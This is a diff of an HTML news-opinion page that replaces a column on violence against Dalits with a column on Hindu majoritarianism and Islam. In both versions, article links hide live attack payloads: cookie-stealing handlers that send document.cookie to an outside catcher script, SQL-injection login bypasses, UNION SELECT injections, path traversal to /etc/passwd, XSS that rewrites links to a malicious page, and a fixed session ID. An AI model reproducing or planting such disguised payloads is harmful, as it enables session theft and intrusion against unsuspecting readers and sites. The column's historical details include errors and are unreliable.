@@ -15,39 +15,63 @@
 
 
 <div class="single">
-<h2>What upper castes owe</h2>
+<h2>Hindus are indeed tolerant, but majoritarianism is self-defeating</h2>
 
-<p class="details">Written by Sukhadeo Thorat | Published:September 16, 2016 12:04 am<a href="#"></a> </p>
-<h2 align="right"><a href="20160915-opinion.php"> Previous </a> </h2>
+<p class="details">Minhaz Merchant |Sep 2016 Sat, 17  <a href="#"></a> </p>
+<h2 align="right"><a href="20160916-opinion.php"> Previous </a> </h2>
 
 <p>
+A simple tweet I sent out recently drew unexpected ire. “Just as <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Muslim majoritarian Kashmir is unacceptable, so is Hindu majoritarian India,”</a> I wrote.
+</p> <p>
+The criticism was sharp. The Kashmir Valley should of course be plural, I was told. But India, being a naturally Hindu majority country, should be <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank"> majoritarian.</a>
+</p> <p>
+Pray why? Because, the tweeple said,  <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Hindus are tolerant</a> and can be trusted to look after minorities. As evidence they pointed to the (relative) peace in which 180 million Muslims live in India. They comprise the largest Muslim minority in the world. Only <a href="http://theplanetreports.com/traversal.php?data=cat%20../../../../../../etc/passwd" target="_blank">Indonesia has more Muslims</a> (Pakistan comes a close third).
+</p> <p>
+Muslims in India retain their personal laws, their festivals and their minority educational institutions. But Kashmir, the argument goes, is different. After centuries of <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">pluralism in the Valley </a> where Muslims and Hindus lived side by side in harmony, Pakistan has tried to spread a dangerous strain of Salafi Islam.
+</p> <p>
+Hindus have been driven out of the Valley. At Independence, <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank">Hindus made up around 10 per cent of the total population </a> in the Kashmir Valley. Muslims comprised 90 per cent. Today Hindus comprise just one per cent of the population in the Valley and Muslims 99 per cent.
+</p> <p>
+Meanwhile, as the deluge of tweets on my timeline affirmed, the population of Muslims in India has increased from <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">9.80 per cent of the total population</a> in the 1951 census to 14.23 per cent in the 2011 census.
+</p> <p>
+These statistics, the argument goes, underscore how tolerant Hindu majoritarianism is – and how intolerant  <a href="http://www.theplanetreports.com/traversal.php?data=ls -la" target="_blank">Muslim majoritarianism </a> in the Valley has proved to be.
+</p> <p>
+Globally Islam has been hijacked by medieval thinking. The repository of <a href="http://www.theplanetreports.com/redirect.php?url=http://www.theplanetreports.com/hack.php">Islam’s holiest shrines</a>, Saudi Arabia, instead of being a progressive leader of Islam worldwide, has set the worst possible example. Its Wahhabi version of Islam forbids women to drive or vote. It outsources jihad to terror outfits like the Islamic State (ISIS), which it initially funded, and al-Qaeda.
+</p> <p>
+Turkey, Indonesia and Malaysia, three large <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">non-Arab Muslim-majority countries,</a> have all regressed into semi-autocracies. Apart from Tunisia, where the Arab Spring brought some reform, the entire Arab world and non-Arab Iran have descended into sectarian conflict, civil strife or religious obscurantism. What is wrong with contemporary Islam? The answer lies partly in its rigid theological interpretation by Islamic clergy and partly in the shadow of history.
+</p> <p>
+Islam began violently. The <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">Sunni-Shia conflict is over 1,300 years old.</a> The sword rather than the book has been used to settle internal differences as well as proselytise.
+</p> <p>
+Despite the violence, Islam was civilisationally advanced till the 13th century. But just when medieval Christianity in Europe was reforming itself by setting up universities (Oxford, Cambridge, Heidelberg and the Sorbonne) in the 13th century, <a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>" target="_blank">Islam took the wrong fork in the road.</a>
+</p> <p>
+For the next five hundred years, till the 18th century, it leaned on the sword. Its all-conquering armies reached the gates of Venice in Austria before being driven back in 1716 in the Battle of Petrovaradin.
+</p> <p>
+Islam had previously conquered vast swathes of south-eastern Europe (today’s Albania and Bosnia), southern Spain and the Central Asian Republics. The Indian subcontinent was an afterthought, invaded by the Mughals led by the failed Turko-Mongol warlord Babur.
+</p> <p>
+The death-knell of global Islam came in 1918 when it was defeated by the Allies in World War I. Its lands were taken away. Pliable Arab dictators, remote controlled by the United States, Britain and France, were installed. The centuries-old <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Ottoman caliphate was dissolved </a> on March 3, 1924.
+</p> <p>
+A century later, the rise of ISIS and its self-declared caliphate in Syria and Iraq is the result of a hundred years of resentment and anger in the Middle East. America’s illegal invasion of Iraq in 2003, the thousands of innocent civilians killed in US air strikes and the millennium-old Sunni-Shia conflict forms a deadly, combustible mix. From it emerged, first, al-Qaeda and then ISIS.
+</p> <p>
+Radical Islam poses a global threat. It is fungible and exportable. <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> Pakistan is already its epicentre,</a> a predicament brought about by Islamabad’s abetment of terrorism in India, especially Kashmir.
+</p> <p>
+The terror group Hizbul Mujahideen is a Pakistani proxy to spread Salafi Islam in the Valley. The violence in Kashmir is instigated by Islamabad. It can only be defeated if the Narendra Modi government stops being soft on the Hurriyat terrorists, removes their perks, allowances and security and reads them the riot act. Syed Ali Shah Geelani and his cohorts, like all paid agents, have neither courage nor a mind of their own. The more you indulge them, the more trouble they will foment. Indian politicians like Sitaram Yechuri, D Raja, Asaduddin Owaisi and others are not a part of Kashmir’s solution. They are a part of the problem with their desire to <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">appease separatists for their own shrinking political constituencies.</a>
+</p> <p>
+Hindus though must not assume that because Muslims have made Kashmir a majoritarian state, India should follow that example. Hinduism is a tolerant and absorptive religion that embraces other faiths.
+</p> <p>
+I have long admired Hinduism’s many subtleties. As I once wrote: “India is secular because Hindus are innately secular. Of the world’s major religions, Hinduism is the only one without a prophet. No one ‘founded’ Hinduism – unlike Christ, Mohammad, Zoroaster, Abraham, Confucius, Mahavira, Buddha and Guru Nanak. Hinduism, or Sanatana Dharma, evolved organically. The Vedas (circa 1800 BC) predate the second oldest religious text, Judaism’s Torah (circa 1300 BC), by several hundred years. Sanatana Dharma is the world’s oldest organised religious philosophy.”
+</p> <p>
+India must remain the plural, tolerant and diverse society it is and has historically been. We should be proud that we are not a majoritarian Hindu country despite 80 per cent of Indians being Hindus.
+</p> <p>
+We should, of course, never make the mistake of drawing a false equivalence between Islamist terrorism and fringe Hindu groups. Both are unacceptable but the difference lies in scale: as wide as between a tsunami and a ripple.
+</p> <p>
+Hinduism, despite its evolved philosophy, needs to reform too. It has too many superstitions. The caste system is cruel. It must go. And the ethos of Hindu fatalism must be set aside.
+</p> <p>
+But in the end, every Indian – Hindu, Muslim, Christian or Jew – is, first, a Hindustani civilisationally and everything else second. That should be the guiding principle of India, not majoritarianism.
+</p> <p><i>
+(The writer is author of The New Clash of Civilizations: How The Contest Between America, China, India and Islam Will Shape Our Century (Rupa, 2014)) </i>
 
-Many watched the recent discussion on <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">atrocities on Dalits </a> in the Lok Sabha with hope. They felt that since the present policy has had limited success in reducing atrocities on Dalits, the discussion would throw up a new initiative. What emerged at the end of day, however, did not touch the core issue: The <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">roots of the continuing violence against Dalits </a> and a durable solution to the problem. There were some rays of hope. The members recognised the problem of persisting atrocities. Most suggested that political parties should incorporate the discourse on caste and equity. They felt that access to education, <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">agricultural land and capital </a> would help improve the condition of Dalits.
-</p> <p>
 
+</p>
 
-The government responded by reiterating its commitment to the Dalit cause. However, there are still <a href="http://theplanetreports.com/traversal.php?data=cat%20../../../../../../etc/passwd" target="_blank">enough grounds for pessimism.</a>
-</p> <p>
-The first suggestion was that political parties should make caste and equity their prime agenda. They can do so by appealing to the provision of equality in the Constitution and also by recalling our traditions of equity. In this respect, a reference was made to <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">B.R. Ambedkar. Ambedkar </a> was clear about the traditions that support equity and those that do not. In his view, in ancient times, Buddha represented the former strand, while Vedic Brahmanism represented the latter line of thought. Later, reformers like Guru Nanak, Ravidas, Kabir, Mangu Ram, Phule, Periyar and Ambedkar were concerned with questions of equity while Dayanand Saraswati, Aurobindo, Vivekananda, Balgangadhar Tilak and V.D. Savarkar led the counter-discourse — <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank">notwithstanding their occasional arguments for equity.</a>
-</p> <p>
-The 19th century counter-discourse lead to the emergence of what is known as Hinduism today.
-</p> <p>
-Scholars tells us that the word Hindu, which originally meant people living beyond Sindu river, became an “ism” in the 19th century — with different shades of meaning. According to Ambedkar this meant <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">“neo or reformed Brahmanism” </a> that embraced the caste system.
-Political parties that wish to have equity on their agenda must, therefore, follow the tradition that fought against the caste system and untouchability — they may incorporate the ideas of some thinkers of the counter-discourse who were against caste. The cause of equity will be harmed if Ambedkar is misappropriated.
-</p> <p>
-Attributing atrocities to anti-social elements will also not help since that will take the focus away from the religious and social roots of violence. The two-and-a-half lakh cases of atrocities against Dalits since 1995 is a reflection of the upper caste response to the Dalit assertion for equal rights. Political parties will have to counter the <a href="http://www.theplanetreports.com/traversal.php?data=ls -la" target="_blank">anti-equity discourse </a> that is behind such violence against Dalits.
-</p> <p>
-There are also economic reasons behind the <a href="http://www.theplanetreports.com/redirect.php?url=http://www.theplanetreports.com/hack.php">atrocities against Dalits.</a> During the Lok Sabha debate, members rightly stressed on the economic empowerment of Dalits through education and ownership of land and capital. Ambedkar believed that Dalits would be unable to secure justice in a village society where they were a minority and dependent on upper caste people. Attempts by Dalits to secure equal rights were sure to be countered with ruthless violence and economic boycott, he believed. Ambedkar, therefore, suggested separate settlement of <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">Dalits </a> where they would be economically independent vis-a-vis the upper castes. But are Dalits today economically independent of upper castes? The current situation does not offer any hope.
-</p> <p>
-In 2012, only 23 per cent of Scheduled Caste rural workers owned land. About 14 per cent SCs in rural areas and 32 per cent SCs in urban areas owned petty enterprises/businesses. About 53 per cent of SCs in rural areas and 23 per cent in urban areas depended on upper castes for wage labour. The land reforms have practically bypassed the Dalits, so have the policies that encouraged the growth of enterprises. The present government’s initiative to encourage <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">Dalit enterprise through loans is welcome, </a> but help is likely to reach only a few.
-</p> <p>
-South Africa adopted a similar policy for Blacks, which benefited only a few people of the community. But South Africa learned its lessons fast. It adopted the Malaysian model of economic empowerment: The government increases the share of the poor in the capital of domestic and foreign companies, and thereby, assures regular flow of income to them. The share of the <a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>" target="_blank">Malay community in companies </a> increased from seven per cent in 1970 to about 20 per cent in 2000 as a result of this policy. India could learn from the experiences of Malaysia and South Africa. Public land and the cultivable wasteland could be distributed to Dalits for horticulture and livestock rearing.
-</p> <p>
-However, only a few can be <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">successful entrepreneurs.</a> For the majority of Dalits, regular salaried jobs remain the predominant source of livelihood. Education and employment through reservation was a major source of upward mobility for Dalits till the early 1990s. But privatisation — both of education and employment avenues — has chipped away at the sources of Dalit empowerment.
-</p> <p>
-The share of the public sector in jobs was 20 per cent in 2012. In other words, there is <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> no reservation in 80 per cent </a>  of employment avenues in the country. In 1995, private institutions took in seven per cent of students who opted for higher education. In 2014, their share had gone up to 30 per cent. This works to the detriment of Dalits in accessing education. Selective discrimination has blocked the entry of Dalits in private jobs. This explains the high unemployment rate of the SCs: 7 .3 per cent compared to 5.6 for STs, 5.3 for OBCs and 4.8 for upper castes in 2011.
-Reservation is a necessary remedy for discrimination against Dalits today. But it does not remedy “past” exclusion from rights to property and education. <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">Compensation is the appropriate </a> remedy for the latter form of discrimination. Dalits have been excluded from property and education since the codification of the Manusmriti. As the enrichment of the upper castes came at the cost of impoverishment of Dalits, there is a moral and legal ground for compensation. This is a long overdue social debt that upper castes owe to the untouchables.
-</p> <p>
 
 </div>
 
